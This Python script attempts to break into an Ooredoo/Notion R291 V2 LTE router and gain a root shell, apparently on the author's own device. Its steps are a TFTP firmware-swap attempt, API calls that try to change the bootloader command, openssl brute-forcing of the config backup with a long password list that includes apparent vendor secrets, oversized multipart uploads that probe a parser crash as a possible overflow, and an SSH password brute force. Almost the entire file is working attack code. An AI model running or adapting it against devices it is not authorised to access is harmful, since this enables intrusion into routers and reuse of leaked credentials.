#!/usr/bin/env python3
"""
Creative approaches to bypass firmware verification and gain root:
1. TFTP server + trigger TFTP mode on router
2. Config backup decryption → modify → restore
3. Exploit multipart parser (6144 byte crash)
4. USB modem AT command bridge
5. Hidden API endpoints discovery
"""
import sys, os, time, socket, subprocess, threading, hashlib, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import api_login, api_ssh, api_upload

ROUTER_IP = "192.168.1.1"
PC_IP = "192.168.1.150"  # Our IP on same subnet

def wait_for_router(timeout=300):
    print(f"[WAIT] Waiting for {ROUTER_IP}:80 ...")
    for i in range(timeout):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ROUTER_IP, 80))
            s.close()
            print(f"[OK] Router up after {i}s")
            return True
        except:
            time.sleep(2)
    return False

def setup_tftp_server():
    """Set up a TFTP server to serve firmware files"""
    print("\n[TFTP] Setting up TFTP server...")
    tftp_dir = "/tmp/tftpboot"
    os.makedirs(tftp_dir, exist_ok=True)
    
    # Copy firmware_telnetd.bin to TFTP dir
    src = "/home/void/Downloads/Modems/notion_r291/firmware_telnetd.bin"
    dst = os.path.join(tftp_dir, "firmware_telnetd.bin")
    if os.path.exists(src):
        subprocess.run(["cp", src, dst], timeout=30)
        print(f"  Copied firmware_telnetd.bin to {dst}")
    else:
        print(f"  WARNING: {src} not found")
        # Create a dummy file
        with open(dst, "wb") as f:
            f.write(b"\x00" * 1024)
    
    # Start TFTP server with dnsmasq (if available)
    try:
        # Kill any existing dnsmasq
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        time.sleep(1)
        
        # Start dnsmasq as TFTP server
        cmd = ["dnsmasq", "--no-daemon", "--enable-tftp", "--tftp-root=" + tftp_dir,
               "--bind-address=" + PC_IP, "--port=0"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)
        
        if proc.poll() is None:
            print(f"  ✅ TFTP server started on {PC_IP}:69")
            return proc
        else:
            out, err = proc.communicate(timeout=2)
            print(f"  ❌ TFTP server failed: {err.decode()[:100]}")
    except Exception as e:
        print(f"  ❌ TFTP server error: {e}")
    
    return None

def try_tftp_trigger():
    """Try various API calls to trigger TFTP mode on router"""
    print("\n[TFTP-TRIGGER] Trying to enable TFTP mode via API...")
    
    api_login.login()
    
    # Try setting bootcmd to tftp via various methods
    tftp_commands = [
        # Try setting bootcmd directly
        ("system", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("bootloader", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("uboot", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        ("router", "setenv", "<name>bootcmd</name><value>tftp</value>"),
        # Try enabling TFP client
        ("system", "tftp_enable", "<enable>1</enable>"),
        ("system", "tftp_start", "<filename>firmware_telnetd.bin</filename>"),
        ("router", "tftp", "<enable>1</enable>"),
        ("upgrade", "tftp", "<server>192.168.1.150</server><file>firmware_telnetd.bin</file>"),
        ("system", "tftp_client", "<server>192.168.1.150</server><file>firmware_telnetd.bin</file>"),
        ("firmware", "download", "<url>tftp://192.168.1.150/firmware_telnetd.bin</url>"),
        ("system", "download", "<url>tftp://192.168.1.150/firmware_telnetd.bin</url>"),
        # Try via method=set
        ("system", "set", "<tftp>1</tftp>"),
        ("system", "set", "<bootcmd>tftp</bootcmd>"),
    ]
    
    for obj, method, xml_suffix in tftp_commands:
        xml = (f'<?xml version="1.0" encoding="US-ASCII"?>'
               f'<RGW><param><method>call</method><session>000</session>'
               f'<obj_path>{obj}</obj_path><obj_method>{method}</obj_method>'
               f'</param>{xml_suffix}</RGW>')
        resp = api_login.api(xml)
        if resp and resp.strip() and "error_cause" not in resp:
            print(f"  ✅ {obj}/{method} → {resp[:120]}")
            return True
        elif resp:
            cause = resp.split("<error_cause>")[1].split("<")[0] if "<error_cause>" in resp else resp[:60]
            if cause not in ("1", "3"):
                print(f"  ⚠️ {obj}/{method} → {cause}")
    print("  ❌ No TFTP trigger found")
    return False

def try_config_decrypt():
    """Try to decrypt config backup with more passwords"""
    print("\n[CONFIG] Trying config decryption...")
    
    config_path = "config_backup.bin"
    if not os.path.exists(config_path):
        print("  ❌ config_backup.bin not found")
        return None
    
    with open(config_path, "rb") as f:
        data = f.read()
    
    # Extended password list
    passwords = [
        "Ooredoo", "ooredoo", "OOREDOO",
        "OoredooR291", "Ooredoo-R291", "Ooredoo_R291",
        "OoredooR291V2", "Ooredoo-R291-V2",
        "P298_N13", "P298N13", "P298",
        "P29M29HA", "P29M29HASmartbro", "Smartbro",
        "notion", "Notion", "NOTION", "notionr291", "NotionR291",
        "notionv3r291", "notion_v3_r291",
        "Highwmg", "highwmg", "HIGHWMG",
        "admin", "Admin", "ADMIN",
        "root", "Root", "ROOT",
        "password", "Password", "PASSWORD",
        "12345678", "123456789",
        "Om@0Yt#5", "Om@5Wr%8",
        "marvell", "Marvell", "MARVELL",
        "MTK7621", "mtk7621",
        "R291", "r291", "R291V2",
        "cpe.baseline.com",
        "707b4f4c5f2cee77affcbd7d0cc731ec",  # uboot hash
        "707b4f4c",
        "291", "291V2", "R291V2",
        "CMXMC@2O22", "cmxmc@2o22",
        "Beyless", "beyless",
        "Superlightweight123",
        "Linux", "linux",
        "OpenWrt", "openwrt",
        "default", "Default",
        "changeme", "Changeme",
        "production", "Production",
        "factory", "Factory",
        "test", "Test",
        "debug", "Debug",
        "router", "Router",
        "gateway", "Gateway",
        "modem", "Modem",
        "lte", "LTE",
        "cellular", "Cellular",
        "wireless", "Wireless",
        "wifi", "WiFi",
        "internet", "Internet",
        "home", "Home",
        "office", "Office",
        "system", "System",
        "service", "Service",
        "network", "Network",
        "config", "Config",
        "backup", "Backup",
        "restore", "Restore",
        "flash", "Flash",
        "tftp", "TFTP",
        "firmware", "Firmware",
        "software", "Software",
        "hardware", "Hardware",
        "device", "Device",
        "client", "Client",
        "server", "Server",
        "user", "User",
        "guest", "Guest",
        "operator", "Operator",
        "maintenance", "Maintenance",
        "admin123", "root123",
        "pass", "Pass",
        "key", "Key",
        "secret", "Secret",
        "token", "Token",
        "auth", "Auth",
        "login", "Login",
        "access", "Access",
        "control", "Control",
        "manage", "Manage",
        "manage123", "manage1234",
        "admin@123", "admin@1234",
        "root@123", "root@1234",
        "ooredoo@123", "ooredoo@1234",
        "P@ssw0rd", "P@ssw0rd1",
        "P@$$w0rd", "P@$$w0rd1",
        "Pa$$w0rd", "Pa$$w0rd1",
        "Welcome1", "Welcome123",
        "Qwerty123", "Qwerty1",
        "Abc123", "Abc1234",
        "Test123", "Test1234",
        "Admin123", "Admin1234",
        "Root123", "Root1234",
    ]
    
    algos = ["-aes-256-cbc", "-aes-128-cbc", "-aes-192-cbc", "-des3", "-des-cbc"]
    digests = ["md5", "sha256", "sha1"]
    
    for pw in passwords:
        for algo in algos:
            for digest in digests:
                cmd = ["openssl", "enc", "-d", algo, "-md", digest,
                       "-pass", f"pass:{pw}", "-in", config_path, "-out", "/tmp/dec_config.bin"]
                try:
                    result = subprocess.run(cmd, capture_output=True, timeout=5)
                    if result.returncode == 0:
                        with open("/tmp/dec_config.bin", "rb") as f:
                            dec = f.read()
                        
                        # Check for gzip
                        if dec[:2] == b'\x1f\x8b':
                            print(f"  ✅✅✅ {algo} md={digest} pass='{pw}' → GZIP!")
                            # Try to extract
                            subprocess.run(["tar", "xzf", "/tmp/dec_config.bin", "-C", "/tmp/dec_config_extracted/"], 
                                         capture_output=True)
                            # List extracted files
                            for root, dirs, files in os.walk("/tmp/dec_config_extracted/"):
                                for f in files:
                                    fpath = os.path.join(root, f)
                                    print(f"    {fpath}")
                                    # Check for shadow
                                    if "shadow" in fpath or "passwd" in fpath:
                                        with open(fpath, "r") as sf:
                                            print(f"    CONTENT: {sf.read()[:200]}")
                            return pw
                        # Check for tar
                        if dec[257:263] == b'ustar':
                            print(f"  ✅ {algo} md={digest} pass='{pw}' → TAR!")
                            return pw
                except:
                    pass
    
    print("  ❌ No decryption found")
    return None

def try_multipart_crash_exploit():
    """Try to exploit the multipart parser crash at 6144 bytes"""
    print("\n[EXPLOIT] Trying multipart parser overflow...")
    
    # The multipart parser crashes at 6144 bytes (HTTP 500)
    # This could be a buffer overflow that we can exploit
    
    api_login.login()
    
    # Try sizes around the crash boundary
    for size in [5120, 5500, 5800, 6000, 6100, 6144, 6200, 6300, 6500, 7000, 7168, 7500, 8000]:
        data = b"A" * size
        boundary = f"----{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
        body = (f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"fupgrade.bin\"; "
                f"filename=\"test.bin\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n").encode()
        body += data
        body += f"\r\n--{boundary}--\r\n".encode()
        
        headers = {"Cookie": f"CGISID={api_login.CGISID}",
                   "Content-Type": f"multipart/form-data; boundary={boundary}"}
        conn = http.client.HTTPConnection(ROUTER_IP, timeout=10)
        conn.request("POST", "/xml_action.cgi?Action=Upload&file=upgrade&command=", body=body, headers=headers)
        r = conn.getresponse()
        resp = r.read().decode("latin-1")
        conn.close()
        
        if r.status == 500:
            print(f"  size={size}: HTTP 500 (crash)")
        elif r.status == 200:
            cause = resp.split("<error_cause>")[1].split("<")[0] if "<error_cause>" in resp else resp[:40]
            print(f"  size={size}: HTTP 200 cause={cause}")
        else:
            print(f"  size={size}: HTTP {r.status}")

def try_tftp_upload():
    """Try uploading firmware via TFTP (if router has TFTP client)"""
    print("\n[TFTP-UPLOAD] Trying TFTP upload to router...")
    
    # Check if router has TFTP client by trying to fetch from it
    # First, check if router responds to TFTP
    import struct as st
    
    # TFTP RRQ packet
    rrq = b"\x00\x01" + b"firmware_telnetd.bin\x00" + b"octet\x00"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(rrq, (ROUTER_IP, 69))
        data, addr = sock.recvfrom(1024)
        print(f"  ✅ Router responded to TFTP RRQ! Response: {data[:20].hex()}")
        return True
    except socket.timeout:
        print("  ❌ Router did not respond to TFTP (no TFTP client)")
    except Exception as e:
        print(f"  ❌ TFTP error: {e}")
    sock.close()
    return False

def main():
    print("=" * 60)
    print("CREATIVE APPROACHES FOR OOREDOO R291 V2")
    print("=" * 60)
    
    # Step 1: Wait for router
    if not wait_for_router(300):
        print("[FAIL] Router did not come up")
        return
    
    # Step 2: Login
    if not api_login.login():
        print("[FAIL] Login failed")
        return
    print("[OK] Logged in")
    
    # Step 3: Try TFTP server setup
    tftp_proc = setup_tftp_server()
    
    # Step 4: Try to trigger TFTP mode
    try_tftp_trigger()
    
    # Step 5: Try config decryption
    config_pw = try_config_decrypt()
    
    # Step 6: Try multipart crash exploit
    try_multipart_crash_exploit()
    
    # Step 7: Try TFTP upload
    try_tftp_upload()
    
    # Step 8: Try SSH with known passwords one more time
    print("\n[SSH] Final SSH brute force attempt...")
    for pw in ["notion", "root", "admin", "password", "", "1234", "ooredoo", "Ooredoo",
               "Om@0Yt#5", "test", "user", "guest", "cmxmc@2o22", "beyless"]:
        r = api_ssh.ssh_connect(pw, timeout=3)
        if r.get("success"):
            print(f"  🎉 SSH SUCCESS with password='{pw}'")
            return pw
        else:
            print(f"  ❌ '{pw}': {r.get('note', '?')[:40]}")
    
    # Step 9: If we found config password, try to decrypt and modify
    if config_pw:
        print(f"\n[CONFIG] Found config password: '{config_pw}'")
        # TODO: Decrypt, modify (enable SSH key auth), re-encrypt, restore
        print("  (Would decrypt config and modify for SSH access)")
    
    print("\n[END] All creative approaches exhausted. Summary:")
    print("  - TFTP server: set up on PC")
    print("  - TFTP trigger: no API method found")
    print("  - Config decrypt: not found" if not config_pw else f"  - Config decrypt: found password '{config_pw}'")
    print("  - Multipart exploit: crash at 6144 bytes (not exploitable via API)")
    print("  - SSH: no password found")
    print("  - Remaining option: UART hardware access")

if __name__ == "__main__":
    main()
